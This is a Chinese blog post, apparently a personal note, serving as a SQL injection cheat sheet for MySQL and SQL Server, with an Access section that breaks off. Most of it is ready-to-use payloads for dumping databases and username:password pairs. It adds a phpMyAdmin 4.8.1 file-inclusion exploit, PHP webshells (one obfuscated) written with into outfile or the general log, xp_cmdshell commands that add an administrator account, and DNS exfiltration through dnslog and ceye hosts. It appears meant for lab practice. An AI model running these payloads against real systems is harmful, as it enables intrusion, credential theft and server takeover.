---
title: 数据库注入
author: 柒妖
top: true
hide: false
cover: true
coverImg: /images/1.jpg
toc: false
mathjax: false
tags:
  - mysql
  - sqlserver
  - access
  - oracle
  - mongodb
date: 2021-02-20 21:57:37
updated: 2021-02-20 21:57:37
permalink: 
urlname: 
categories: 
img: 
password: 
summary: 
---

[TOC]



 ## MySql

### **联合查询**

```mysql
# 需要使用的函数
concat() 	# 将多个字串连接为一行输出
group_concat() 	# 可以配合 group by asc/desc 使用
group_ws() 	# 增加分隔符号并将字串连接为一行输出
version() 	# 显示版本
database() 	# 显示当前数据库
union select 	# 联合查询
information_schema.schemata 	# 存储所有库名的位置
schema_name 	# 查库名
table_name 		# 查表名
column_name 	# 查字段名
distinct() 		# 去重
limit 1,1 		# 从第 N 条记录开始, 返回 M 条记录

# 判断注入
?id=0'"\)]}--+		# 判断是否是字符型和闭合情况
?id=0 and 1=1	# 盘点是否是数字型
# 判断显示字段数
?id=0' order by 3 --+	# 回显正常为正确字段数
# 判断显示位置
?id=0' union select 1,2,3 --+
# 查看数据库版本,和当前数据库名
?id=0' union select 1,database(),version() --+
# 查看所有数据库名
?id=0' union select 1,2,schema_name from information_schema.schemata limit 1,1 --+
?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
# 查看数据库的表名和当前数据库的表名
?id=0' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+
?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' --+
# 查看表中字段名
?id=0' union select 1,2 column_name from information_schema.columns where table_name='表名' limit 0,1 --+
?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' --+
# 查看表中数据
?id=0' union select 1,2,group_concat(字段,": ",字段) from 表名 --+
?id=0' union select 1,2,group_ws("~",字段,字段) from 表名 --+
?id=0' union select 1,2,concat(字段,字段) from 表名 --+
?id=0' union select 1,字段1,字段2 from 表名 limit 0,1--+
```

### **报错注入**

```mysql
# 测试注入点时,故意构造错误的MySQL语句,如果页面回显的错误信息为数据库报出来的错误,即可使用报错注入,只显示32位长度的数据
# 报错注入使用的函数
extractvalue(参数1,参数2) 	# 参数1表示操作的目标XML文档，参数2则表示目标XML的查找路径。
updatexml(参数1,参数2,参数3)	    # XML文档,路径,替换值,原理和 extractvalue() 是相同的
substr(1,30) 	# 截断字串位数, 1 起始位置, 30 长度
# 查看库
?id=0' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '
# 查看表
?id=0' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from infomation_schema.tables where table_schema='库名')0x7e)) or'
# 查看表,截断32位显示
?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_shcema='库名' limit 0,1),32),0x7e)) or'
# 查看字段
?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from infomation_schema.columns where table_name='表名' limit 0,1),32),0x7e)) or'
# updatexml 报错注入 查看字段
?id=0' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_name='表名'),32)0x7e),0) or'
# 查看表中数据
?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(字段1,": "字段2) from 表名 limit 0,1),32),0x7e)) or'
```

```mysql
# floor报错注入和前面两个函数不同，floor函数报错注入的原理涉及到以下几个函数：
1. floor()：小数向下取整数（向上取整数是ceiling()函数）
2. rand()：随机返回0 ~ 1之间的小数
3. concat_ws()：将括号内的数据用第一个字段连接起来
4. group by子句：分组语句，常用于结合统计函数，根据一个列或多个列，对结果集进行分组
5. as：就是别名
6. count函数：汇总统计数量
7. limit：显示指定行数
# 
```

### **布尔盲注**

```mysql
# 判断当前库名长度和所有库名的长度
?id=0' and length(database())>5 --+
?id=0' and length((select group_concat(schema_name) from
information_schema.schemata))=90--+
# 判断当前库名
?id=0' and (substr(database(),1,1))>'a' --+
?id=0' and ascii(substr(database(),1,1))>100 --+
?id=0' and ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),1,1))=112 --+
# 判断表
?id=0' and ascii(substr((select group_concat(table_name) from information_schema.tables limit 0,1),1,1))=112 --+
# 判断字段
?id=0' and ascii(substr((select group_concat(column_name) from information_schema.columns limit 0,1),1,1))=112 --+
```

### **时间盲注**

```mysql
# 布尔的payload 套一层 if slee() 就可以变成 时间盲注
# 语法1. sleep()函数:让数据库暂停n秒, if(select database(),sleep(5),1)
# 语法2. benchmark()函数:命令执行次数, benchmark(50000000,md5('1'))
# 判断注入
?id=0' and sleep(5) --+
?id=0' and benchmark(50000,md5('1'))--+
# 判断库名长度
?id=0' and if(length((select group_concat(schema_name) from information_schema.schemata))=90,sleep(5),0) --+
# 判断库名
?id=0' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),71,1))=112,sleep(5),0) --+
```

#### **token防爆破**

![image-20220206180531938](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116364.png)

![image-20220206180509330](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116031.png)

![image-20220206180616794](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116941.png)

![image-20220206181026584](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116982.png)

![image-20220206181047274](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116904.png)

![image-20220206181134849](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116673.png)

![image-20220206181146506](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116202.png)

![image-20220206181348236](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116132.png)

![image-20220206181600606](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116363.png)

![image-20220206181733746](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116926.png)

![image-20220206181825835](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120827.png)

![image-20220206181843657](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120918.png)

#### **搜索型注入**

```
%		//判断回显用户
vi%' order by 3 #	//判断字段数
vi%' union select 1,2,3 #		//回显点
vi%' union select version(),database(),3 #		//版本和当前库名
```

![image-20220206195611524](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120259.png)

![image-20220206201152078](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120752.png)

![image-20220206201304437](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120192.png)

```
所有库
vi%' union select 1,2,group_concat(schema_name) from information_schema.schemata #
爆表
vi%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
爆字段
vi%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #
爆内容
vi%' union select 1,2,group_concat(username,": ",password) from users #
```

![image-20220206201836920](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120502.png)

![image-20220206202317937](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120054.png)

#### **xx型注入**

```
1') or 1=1 #	//判断注入
1') order by 2 #		//判断字段数
1') union select 1,2 #		//判断回显点
1') union select version(),database() #		//版本和当前库名
//所有库
1') union select 1,group_concat(schema_name) from information_schema.schemata #
//爆表
1') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
//爆字段
1') union select 1,group_concat(column_name) from information_schema.columns where table_name= 'users' #
//爆内容
1') union select 1,group_concat(username,": ",password) from users #
```

![image-20220206203126592](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120465.png)

![image-20220206203255820](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120123.png)

![image-20220206203430444](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120603.png)

![image-20220206204158481](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120748.png)

#### **insert型注入**

![image-20220206205311630](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120316.png)

![image-20220206205337892](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120998.png)

#### **报错注入 extractvalue**

```
爆库
123'and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '
爆表
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit+0,1),0x7e)) or'	//前面32位
1' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit 0,1),32),0x7e)) or'		//最后几位
```

![image-20220206205604457](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120573.png)

![image-20220206205955260](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120595.png)

![image-20220206210157224](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120585.png)

```
爆字段
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e)) or'		//前面0-32位
1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),32),0x7e)) or'	//中间32-64位
1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),64),0x7e)) or'	//64-96
1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),96),0x7e)) or'	//最后
```

![image-20220206210857784](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120355.png)

```
爆内容
1' and extractvalue(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e)) or'
1' and extractvalue(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),64),0x7e)) or'
1' and extractvalue(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),96),0x7e)) or'
```

![image-20220206211030191](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120512.png)

#### **update型注入**

```
库名
1'and updatexml(1,concat(0x7e,database()),0) or'
```

```
表名
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from
information_schema.tables where table_schema="pikachu"),0x7e),1) or'
1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema="pikachu"),32),0x7e),1) or'
```

```
字段
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e),1) or'
1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name="users"),32),0x7e),1) or'
```

```
字段内容
1' and updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),1) or'
1' and updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),1) or'
```

![image-20220206212343188](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119002.png)

#### **datele注入**

![image-20220206212501799](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119273.png)

![image-20220206212553298](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119879.png)

```
库名
1 and updatexml(1,concat(0x7e,database()),0)
```

![image-20220206213130375](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119535.png)

```
爆表
1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),0x7e),0)
1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),32),0x7e),0)
```

```
爆字段
1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="users"),0x7e),0)
1 and updatexml(1,concat(0x7e,substr((select group_concat(column_name)from information_schema.columns where table_name="users"),32),0x7e),0)
```

```
爆内容
1 and updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),0)
1 and updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),0)
```

![image-20220206213548868](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119356.png)

#### **http header 注入**

登录后, burp抓包,报错注入

![image-20220206215455326](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119228.png)

```
爆库
1' or updatexml(1,concat(0x7e,database()),0) or'
```

![image-20220206215632287](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119835.png)

cookie处也可以注入

![image-20220206220210457](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119178.png)

```
爆表
1' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),0x7e),0) or'
1 or updatexml(1,concat(0x7e,substr((select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),32),0x7e),0) or'
```

![image-20220206220350183](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119236.png)

```
爆字段
1' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="users"),0x7e),0) or'
1' or updatexml(1,concat(0x7e,substr((select group_concat(column_name)from information_schema.columns where table_name="users"),32),0x7e),0) or'
```

![image-20220206220526610](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119219.png)

```
爆内容
1' or updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),0) or'
1' or updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),0) or'
```

![image-20220206220629288](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119846.png)

#### **文件包含**

##### **复现phpmyadmin4.8.1文件包含漏洞**

![image-20220120215219906](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142081.png)

根据这几行代码可以知道, 将$_REQUEST['target']所表示的文件包含进来,target参数需要满足5个条件

 	1. 不能为空
 	2. 需要是字串
 	3. 不能以index开头
 	4. 不能在$target_blacklist数组里面
 	5. 满足Core类里面的checkPageValidity()函数检查

phpmyadmin/libraries/classes/Core/php的443-476行

![image-20220120220021134](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142769.png)

根据这个代码知道要使checkPageValidity()函数返回true,需要满足3个条件判断

![image-20220120220439241](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142548.png)

1. $page变量的值在 \$whilte_list数组中会返回true

2. 经过mb_substr()和mb_strpos()处理的\$page->\$_page的变量值在\$whitelist数组中
3. 经过urldecode(),mb_substr(),mb_strpos()处理的\$page–>\$_page的变量值在\$_whitelist数组中，这里值的分析的是$page是经过两次url解码再进行同(2)相同的函数处理，第一次由服务器自动解码了一次，然后再由urldecode()函数解码一次，所以在构造payload的时候‘?’应该url编码两次–>‘%253f’.
    结合这两处代码，可以开始漏洞复现了。

###### **任意文件包含**

构造payload来包含该文件 `http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd`

![image-20220120222107523](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141163.png)

利用phpMyAdmin 4.8.1后台文件包含漏洞，获取登录phpmyadmin系统所产生的sess_sessionID文件，通常linux系统中存放路径为`/tmp/sess_[当前会话session值]`

![image-20220120222149478](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141602.png)

写入`select '<?php phpinfo ?>' into outfile '/var/www/html/index.php' `

![image-20220120230642515](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141743.png)

`?index.php?target=db_sql.php%253f/…/…/…/…/…/…/tmp/sess_2km6pa2qec2ci6fhmfb916mivb`

![image-20220120230841240](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141212.png)

##### **phpmyadmin getshell实验**

查看全局日志是否开启,执行如下命令：show variables like "%general%";

![image-20220120232114606](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148099.png)

全局日志是关闭状态



执行 `set global general_log = on` 打开全局日志

<img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148671.png" alt="image-20220120232738314"  />

ssh登录 密码:ICQsafe666 查看目录权限

![image-20220121002402608](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148525.png)

执行 `set global general_log_file = "/var/www/html/uploads/index.php"` 设置日志存放路径,放在网站的根目录下

![image-20220120232935354](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148732.png)

###### **写入shell一句话马**

执行 `select "&lt;?php @eval（$_POST[cmd]）;?>"` 

![image-20220120234031183](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148562.png)

![image-20220121002158042](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148255.png)

蚁剑连接

![image-20220220214919531](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202149045.png)

**全局日志必须开启**

**必须有目录写权限**

**必须知道网站的绝对路径**

##### **第二种方法：通过 into outfile 写入shell**

**必须知道网站的绝对路径**

select "<?php $eZGQ=create_function(chr(077660/01614).base64_decode('cw==').base64_decode('bw==').chr(0276600/01600).chr(79083/783),chr(0xebee/0x256).base64_decode('dg==').str_rot13('n').str_rot13('y').chr(0x5758/0x22f).str_rot13('$').chr(01063-0700).chr(107892/972).chr(01457-01302).str_rot13('r').base64_decode('KQ==').chr(0x8f5a/0x26e));$eZGQ(base64_decode('OTExM'.'Tg4O0'.'BldkF'.'sKCRf'.''.chr(47685/561).chr(0151306/01416).str_rot13('9').chr(051530/0376).chr(0456-0330).''.''.base64_decode('Rg==').chr(0275627/01515).chr(0x35b-0x2e3).base64_decode('TQ==').str_rot13('w').''.'NdKTs'.'yNzMz'.'NTY0O'.'w=='.''));?>" into outfile "/var/www/html/uploads/1234.php"

![image-20220220215019683](https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202150034.png)

### **数据外带**

​		sql注入和命令执行或xxe或ssrf, 凡是看不到回显的地方需要利用数据外带,

DNSlog和smb服务和HTTPlog或CEYE外带数据.

​		DNSlog和 SMB : mysql, mssql

​		HTTPLog: oracle, mssql

​		1. 需要有一个域名, 可以在[这里](http://dnslog.cn/)获取一个临时的 或在 [ceye](http://ceye.io/) 申请一个

​		2. docker 拉取dnslog 的镜像, 然后安装, 也可以

​		3. httplog服务器外带数据

​				python3 -m http.server 9000 	# 开启一个http服务

```mysql
# SMB 服务器外带数据
​	1. 需要在服务器上开启smb服务
​	2. 连接指定ip地址的服务器 schtasks /create /s \\192.168.xxx.xxx /v /u admin /p 1234 /tn
​	3. select load_file('\\\\smb.xx.dmslog.cn服务器\\\xxx')
​	4. select load_file(concat('\\\\\\','  hex(version())  ', '.mysql.xxx.dnslog.xx\\xxx')) 数据外带
​	5. 只能在windows上利用
```

有时候注入发现并没有回显，也不能利用时间盲注，那么就可以利用带外通道，也就是利用其他协议或者渠道，如http请求、DNS解析、SMB服务等将数据带出。

**payload**

```mysql
select load_file(concat('\\\\',(select database()),'.xx.xx\\x));
```

其中的load_file的地址为一个远程文件，mysql在load_file()一个远程文件时会发送dns请求包去解析，所以可以带出数据，'\\data.xx.xx\x' ，xx.xx为自己的服务器名，没有的话可以去这里 [ceye.io](http://ceye.io) 申请一个

**mysql外带数据注入条件**

\1. mysql.ini 中 secure_file_priv 必须为空

( ps. 修改mysql.ini 文件，在[mysqld] 下加入 secure_file_priv =  )

> mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。
>
> - 当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
> - 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
> - 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

```mysql
# 数据外带语法
?id=1 and 1=(select load_file(concat('\\\\', (payload), '.mysql.dns域名\\xxx')))
# 例如 外带数据库名出来
?id = 1 and 1=(select load_file(concat('\\\\', (select hex(table_name) from information_schema.tables where table_schema=database() limit 0,1), '.mysql.ol84xv.dnslog.cn\\xxx')))
```



## SQL_Server

### **SQL_Server联合查询**

```mssql
# 判断注入类型
?id=0'"\)]}--	# 判断是否是字符型和闭合情况
?id=0 and 1=1	# 盘点是否是数字型
# 判断字段数
?id=0' order by 3	# 回显正常为正确字段数
# 判断回显位置
?id=0' union select 1,2,3 -- 
# 查看当前库名和版本信息
?id=0' union select 1,db_name(),@@version() --
# 查看所有库
?id=0' union select top 1 1,2,name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases) --
# 查看指定库中表的数量
?id=0' union select 1,2,count(name) from 库名..sysobjects where xtype='U' --
# 查看表
?id=0' union select top 1 1,2,name from 库名..sysobjects where xtype='U' and name not in (select top 0 name from 库名..sysobjects where xtype=char(85)) --
# 查看字段
?id=0' union select top 1 1,2,name from 表名..syscolumns where xtype=char(85) and name not in (select top 0 name from 表名..syscolumns where xtype='U') --
# 查看指定表中字段的数量
?id=0' union select 1,2,count(*) from 库名.dbo.syscolumns where id = object_id ('表名') --
# 查看表中字段
?id=0' union select top 1 1,2,name from 库名..syscolumns where id = object_id('表名') and name not in (select top 0 1,2,name from 库名..syscolumns where id = object_id('表名')) --
# 查看表中内容
?id=0' union select top 1 1,字段1,字段2 from 表名 where 字段1 not in (select top 0 username from users) and 字段2 not in (select top 0 password from 表名) --
```

### **SQL_Server报错注入**

```mssql
# 测试注入点时,故意构造错误的MySQL语句,如果页面回显的错误信息为数据库报出来的错误,即可使用报错注入
# 查看版本
?id=0' and 1=(convert(int,@@version)) --
# 查看所有库
?id=0' and 1=(select top 1 name from master..sysdatabases where name not in (select top 1 name from master..sysdatabases)) --
# 查看表
?id=0' and 1=(select top 1 name from 库名..sysobjects where xtype='U' and name not in (select top 0 name from 库名..sysobjects where xtype='U')) --
# 查看字段
?id=0' and 1=(select top 1 name from 库名.dbo.syscolumns where id =object_id ('表名') and name not in (select top 0 name from 库名.dbo.syscolumns where id =object_id ('表名'))) --
# 查看表内容
?id=0' and 1=cast((select substring((select username,': ', password,'~' from 表名 for xml path('')),1,500))as int)--

# 其他语法 爆当前库
?id=1' and 1=convert(int,db_name()) --
?id=1' and 1=cast(db_name() as int) --
# 爆当前库表
?id=1' and 1=cast((select quotename(name) from sysobjects where xtype=char(85) for xml path(''))as int) --
# 爆当前表字段
?id=1' and 1=cast((select quotename(name) from syscolumns where id=(select id from sysobjects where name='users' and xtype='U') for xml path(''))as int) --
```

### **SQL_Server布尔盲注**

```mssql
# 判断注入
?id=0' and 1=0 --
?id=0' and 1=1 --
# 判断库数量
?id=0' and 1=(select count(*) from master.dbo.sysdatabases where dbid=7) --
# 判断库长度
?id=0' and 1=(select count(*) from master.dbo.sysdatabases where dbid=1 and len(name)=6)--
# 爆库
?id=0' and (select top 1 ascii(substring(name,1,1)) from sys.sysdatabases where name not in (select top 0 name from sys.sysdatabases))=109--
# 判断指定库中表的数量
?id=0' and (select count(*) from 库名.dbo.sysobjects where name in (select top 1 name from 库名.dbo.sysobjects) and len (name)=9) --
# 爆表 ps:substring(name,1-n,1) 表名第一个字母
?id=0' and (select top 1 ascii(substring(name,1-n,1)) from 库名..sysobjects where name not in (select top 0 name from 库名..sysobjects))=115--
```

### **SQL_Server时间盲注**

```mssql
# 判断注入
?id=0' waitfor delay '0:0:3' --
# 判断库数量
?id=0' if ((select count(*) from master.dbo.sysdatabases where dbid=7)=1) waitfor delay '0:0:3'--
# 判断库的长度
?id=0' if ((select count(*) from master.dbo.sysdatabases where dbid=1 and len(name)=6)=1) waitfor delay '0:0:3'--
# 爆库
?id=0' if (select top 1 ascii(substring(name,1,1)) from sys.sysdatabases where name not in (select top 0 name from sys.sysdatabases))=109 waitfor delay '0:0:3'--
# 判断表数量
?id=0' if ((select count(*) from 库名.dbo.sysobjects where name in (select top 1 name from 库名.dbo.sysobjects) and len (name)=9)=1) waitfor delay '0:0:3' --
# 爆表 ps:substring(name,1-n,1) 表名第一个字母
?id=0' if (select top 1 ascii(substring(name,1-n,1)) from model..sysobjects where name not in (select top 0 name from model..sysobjects))=115 waitfor delay '0:0:3'--
```

### **SQL_Server多语句注入**

```mssql
# 只有sqlserver 可以直接注入并修改数据
# 报错堆叠注入查看库
?id=0'; and 1=(select top 1 name from master..sysdatabases where name not in (select top 1 name from master..sysdatabases)) --
# 报错堆叠注入查看表
?id=0'; and 1=(select top 1 table_name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)) --
# 报错堆叠注入查看表字段
?id=0'; and 1=(select top 1 column_name from information_schema.columns where table_name = 'users' and table_name not in (select top 1 column_name from information_schema.columns)) --
# 新建库
?id=0'; create dababase test --
# 插入数据
?id=0'; insert into users(id,username,password) values(1,'zs',123) --
# 更改所有用户密码
?id=0'; update users set password='123' --
```

### **xp_cmdshell的命令执行**

```mssql
# 利用xp_cmdshell 可以在系统里面执行命令
# 默认是关闭状态,需要sha 帐号才可以开启
# 4 条命令
# 设置options选项
?id=0'; exec sp_configure 'show advanced options', 1; --
# 刷新
?id=0'; reconfigure; --
# 开启xp_cmdshell
?id=0'; exec sp_configure 'xp_cmdshell', 1; --
# 刷新
?id=0'; reconfigure; --
# 测试是否开启成功
# 终端输入 curl dns.log地址, dns.log地址有回显则开启成功
?id=1'; exec master..xp_cmdshell "linux使用curl/wget" --
# 执行命令增加账户
?id=1'; exec master..xp_cmdshell 'net user zs p@ssw0rd/add'; --
# 执行命令将用户添加到管理员组
?id=1'; exec master..xp_cmdshell "net localgroup administrators admin/add" --
--------------------------------------------------------
--------------------------------------------------------
# 创建一个sqldata表,再把命令执行结果写入到表中
?id=1'; create table sqldata(result VARCHAR(8000));--
# 直接写入,xp_cmdshell后面可以是ipconfig或是echo 1 等等
?id=1';INSERT INTO sqldata (result) EXEC..xp_cmdshell "net user" --
# 或者写入 SET @adqa 将命令编码并赋值给@adqa变量,写入sqldata表
?id=1'; DECLARE @adqa VARCHAR(8000);SET
@adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa--
# 报错注入获取命令执行结果.需要使用 isnull,清除空数据
?id=1' and 1<(select top 1 result from sqldata where result not in (select top 2 isnull(result,'') from sqldata)) --
```

### **SQL_server 数据外带**

```mssql
# cmdshell 被删或绕过时, 使用下面这个函数
xp_dirtree('dnslog')
sp_oacreata('')
# 1. 先定义一个变量 declare @a varchar(1024)
# 2. 将要执行的命令赋值给变量 set @a=db_name()
# 3. 2进制到16进制的函数, master.dbo.fn_varbintohexstr()
-----------------------------------------------------------------------------------------------------
# 例如: 
?id=1; declare @a varchar(1024);
set @a = '\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),substring(@@version,1,15)))+'dns域名';
exec xp_dirtree @a;
?id=1; declare @a varchar(1024);
set @a='\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),(select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases))))+'dns域名';
exec xp_dirtree @a;
?id=1; declare @a varchar(1024);
set @a='\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),(select top 1 name from 库名..sysobjects where xtype=char(85) and name not in (select top 1 name from 库名..sysobjects where xtype=char(85)))))+'dns域名'
exec xp_dirtree @a;
-----------------------------------------------------------------------------------------------------
# 数据外带实例
# 爆库
http://127.0.0.1/info.aspx?id=1;
declare @a varchar(1024);
set @a=(select top 1 name from master..sysdatabases where name not in
(select top 1 name from master..sysdatabases));
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
# 爆当前连接的数据库名
http://127.0.0.1/info.aspx?id=1;
declare @a varchar(1024);
set @a=(select db_name());
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
# master库的表数量是2033,其中用户自建表数量为20
declare @a varchar(1024);
set @a=(select count(name) from master..sysobjects where xtype='U');
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
#
22-57
declare @a varchar(1024);
set @a=(select count(name) from "22"..sysobjects where xtype='U');
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
# 爆 master 库表
declare @a varchar(1024);
set @a=(select top 1 name from master..sysobjects where xtype=char(85) and
name not in (select top 1 name from master..sysobjects where
xtype=char(85)));
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
# 22库中的 DB_Admin 表有11条数据
declare @a varchar(1024);
set @a=(select count(*) from "22".dbo.syscolumns where id = object_id
('DB_Admin'));
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
# 爆DB_Admin字段
http://127.0.0.1/info.aspx?id=1;
declare @a varchar(1024);
set @a=(SELECT top 1 "22".dbo.syscolumns.name FROM
"22"..syscolumns,"22"..sysobjects where "22"..syscolumns.id =
"22"..sysobjects.id AND "22"..sysobjects.name='DB_Admin' and
"22"..syscolumns.name not in (SELECT top 3 "22"..syscolumns.name FROM
"22"..syscolumns,"22"..sysobjects where "22"..syscolumns.id =
"22".dbo.sysobjects.id AND "22"..sysobjects.name='DB_Admin'));
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
# 数据 帐号 admin
http://127.0.0.1/info.aspx?id=1;
declare @a varchar(1024);
set @a=(select top 1 UserName from DB_Admin where username not in (select top
0 username from DB_Admin));
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
# 数据 密码 123456
declare @a varchar(1024);
set @a=(select top 1 UserName from DB_Admin where username not in (select top
0 username from DB_Admin));
exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');
-----------------------------------------------------------------------------------------------------
http://127.0.0.1/info.aspx?id=1;declare @a varchar(1024);
set @a='\\'%2bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), (SELECT top 1 库名.dbo.syscolumns.name FROM 库名..syscolumns,库名..sysobjects where 库名..syscolumns.id = 库名..sysobjects.id AND 库名..sysobjects.name='表名' and 库名..syscolumns.name not in (SELECT top 0 库名..syscolumns.name FROM 库名..syscolumns,库名..sysobjects where 库名..syscolumns.id = 库名.dbo.sysobjects.id AND 库名..sysobjects.name='表名'))))%2b'.z.xxx.ceye.io';
exec xp_dirtree @a;
```



## Access

### **Access_联合查询**

```access
# Access 只能单纯的注入拿数据,没有 information_schema 且没有库的概念, 一个文件就是一个数据库, 没有时间盲注和报错注入
# 常用函数
